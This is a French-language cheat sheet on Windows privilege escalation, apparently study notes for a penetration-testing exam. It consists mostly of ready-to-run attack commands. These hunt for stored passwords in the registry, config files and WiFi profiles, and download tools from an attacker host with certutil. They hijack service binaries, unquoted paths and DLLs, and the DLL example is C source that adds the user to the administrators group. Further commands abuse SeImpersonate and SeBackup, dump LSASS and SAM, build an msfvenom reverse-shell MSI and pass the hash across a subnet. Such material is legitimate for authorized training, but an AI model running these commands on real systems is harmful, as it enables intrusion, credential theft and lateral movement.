# 15 — Windows Privilege Escalation

## Objectifs
Passer d'un utilisateur standard à Administrateur / SYSTEM, **manuellement d'abord**. En examen, l'énumération méthodique bat les outils automatiques.

---

## 1. Situational awareness

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
route print
net user
net localgroup
net localgroup administrators
net share
netstat -ano
tasklist /svc
```

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-Process | Select Name,Id,Path
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-ScheduledTask
Get-CimInstance Win32_Product | Select Name,Version
```

### Privilèges à repérer
```cmd
whoami /priv
```

| Privilège | Exploitation |
|---|---|
| `SeImpersonatePrivilege` | PrintSpoofer, GodPotato, JuicyPotato |
| `SeAssignPrimaryTokenPrivilege` | idem |
| `SeBackupPrivilege` | copier SAM/SYSTEM |
| `SeRestorePrivilege` | écrire fichiers protégés |
| `SeTakeOwnershipPrivilege` | prendre possession |
| `SeDebugPrivilege` | dump LSASS |
| `SeLoadDriverPrivilege` | charger un driver |
| `SeManageVolumePrivilege` | accès disque brut |

---

## 2. Informations « cachées » (hidden in plain view)

```cmd
:: Historique PowerShell
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: Fichiers de config / backups
dir /s /b C:\*.config C:\*.ini C:\*.txt C:\*.bak 2>nul
dir /s /b C:\Users\*pass* C:\Users\*cred* 2>nul
type C:\Windows\Panther\unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\inetpub\wwwroot\web.config

:: Registre
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

:: Credentials enregistrés
cmdkey /list
runas /savecred /user:<DOMAIN>\<USER> cmd.exe

:: WiFi
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

:: Partage / scripts de login
dir \\<DC>\NETLOGON /s
```

```powershell
# Recherche de chaînes sensibles
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config,*.ini -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password","passwd","pwd" -SimpleMatch
```

---

## 3. Énumération automatique (après le manuel)

```powershell
# WinPEAS
.\winPEASx64.exe
.\winPEASx64.exe log=winpeas.txt
# PowerUp
Import-Module .\PowerUp.ps1; Invoke-AllChecks
# Seatbelt
.\Seatbelt.exe -group=all
```

```cmd
:: Transférer si nécessaire
certutil -urlcache -f http://<LHOST>/winPEASx64.exe C:\Temp\wp.exe
powershell -c "Invoke-WebRequest -Uri http://<LHOST>/winPEASx64.exe -OutFile C:\Temp\wp.exe"
```

Toujours **vérifier** ce que l'outil signale : beaucoup de faux positifs.

---

## 4. Service binary hijacking

```cmd
:: Lister les services non-Microsoft et leurs binaires
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
```

```cmd
:: Vérifier les permissions du binaire / du dossier
icacls "C:\Path\service.exe"
icacls "C:\Path"
accesschk.exe /accepteula -uwcqv "Users" "C:\Path"
```

```cmd
:: Remplacer le binaire (si writable)
copy /Y C:\Temp\shell.exe "C:\Path\service.exe"
sc stop <SERVICE>
sc start <SERVICE>
```

```powershell
# Réécrire le chemin du binaire (si SERVICE_CHANGE_CONFIG)
sc.exe config <SERVICE> binPath= "C:\Temp\shell.exe"
# PowerUp
Invoke-ServiceAbuse -Name <SERVICE> -Command "net localgroup administrators <USER> /add"
```

---

## 5. Unquoted service paths

```cmd
sc qc <SERVICE>
:: BINARY_PATH_NAME : C:\Program Files\My App\service.exe   (sans guillemets)
```

Windows essaie dans l'ordre :
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```

```cmd
:: Créer le fichier intermédiaire (si le dossier parent est writable)
copy C:\Temp\shell.exe "C:\Program Files\My.exe"
sc stop <SERVICE> && sc start <SERVICE>
```

```powershell
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
  Select Name,PathName,StartMode
```

---

## 6. DLL hijacking

```cmd
:: Trouver les DLL manquantes (Process Monitor, filtre "NAME NOT FOUND")
:: Un service charge mylib.dll depuis un dossier writable ou le PATH
```

```powershell
# Vérifier les permissions du dossier
icacls "C:\Path"
```

```c
// hijack.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    if (r == DLL_PROCESS_ATTACH) {
        system("net localgroup administrators <USER> /add");
        // ou reverse shell
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

```cmd
copy hijack.dll "C:\Path\missing.dll"
sc stop <SERVICE> && sc start <SERVICE>
```

---

## 7. Scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

Points à vérifier :
- Tâche exécutée en `SYSTEM` ou `Administrateur`
- Binaire / script **writable**
- Dossier parent writable
- Trigger fréquent

```cmd
icacls C:\Path\Task.exe
copy /Y C:\Temp\shell.exe C:\Path\Task.exe
```

```powershell
Get-ScheduledTask | ForEach-Object {
  $a = $_.Actions | Select-Object Execute,Arguments
  [pscustomobject]@{Name=$_.TaskName; RunAs=$_.Principal.UserId; Action=$a}
}
```

---

## 8. Privilege abuse (SeImpersonate, SeBackup…)

### SeImpersonate → SYSTEM
```cmd
PrintSpoofer64.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
```

### SeBackupPrivilege
```cmd
robocopy /b C:\Windows\System32\config C:\Temp sam
reg save HKLM\SAM C:\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Temp\system.hiv
```
```bash
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

### SeDebugPrivilege
```cmd
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

### SeTakeOwnership
```cmd
takeown /f C:\Path\file.exe
icacls C:\Path\file.exe /grant <USER>:F
```

---

## 9. AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: les deux doivent valoir 0x1
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o shell.msi
```
```cmd
msiexec /quiet /qn /i C:\Temp\shell.msi
```

---

## 10. Exploits locaux

```cmd
systeminfo
wmic qfe list brief
```

| CVE | Cible |
|---|---|
| MS16-032 | Secondary Logon (Win 7–10 anciens) |
| MS17-010 | SMBv1 |
| CVE-2021-1732 | Win32k (Win 10 20H2) |
| CVE-2021-34527 | PrintNightmare |
| CVE-2020-1472 | Zerologon (DC) |

```powershell
.\Watson.exe
# ou Sherlock.ps1 / windows-exploit-suggester
```

Choisir un exploit **compatible build** et le tester sur une VM si possible avant la cible.

---

## 11. Credentials & mouvement

```cmd
:: Dump local
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET>
:: Si admin local
net localgroup administrators
```

```cmd
:: Réutilisation (le mot de passe local admin est souvent identique partout)
netexec smb 10.10.10.0/24 -u Administrator -H <NTHASH> --local-auth
```

---

## 12. Checklist

- [ ] `whoami /all`, `systeminfo`, groupes, privilèges
- [ ] Historique PowerShell + fichiers config/backup
- [ ] Registre (Run, Winlogon, autologon)
- [ ] `cmdkey /list` + `runas /savecred`
- [ ] Services : chemins, permissions, non quotés
- [ ] DLL manquantes sur services
- [ ] Tâches planifiées
- [ ] Privilèges abusables (SeImpersonate, SeBackup…)
- [ ] AlwaysInstallElevated
- [ ] Patches / exploits locaux
- [ ] Creds réutilisés sur le réseau
- [ ] Preuve (`proof.txt`) + note de la méthode
